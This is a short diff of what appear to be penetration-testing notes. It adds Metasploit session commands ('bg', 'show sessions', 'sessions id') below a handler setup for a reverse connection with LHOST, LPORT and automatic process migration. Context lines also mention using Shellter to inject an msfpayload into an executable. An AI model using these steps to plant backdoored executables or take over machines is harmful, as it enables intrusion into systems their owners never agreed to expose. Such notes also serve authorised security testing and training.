@@ -70,5 +70,9 @@ set LHOST ip
 set LPORT port
 set AutoRunScript post/windows/manage/migrate
 exploit
+1.1 metasploit backgroup commands:
+bg
+show sessions
+sessions id
 2. Use shelter to inject msfpayload into exe(tracing must be successfully)
 ```
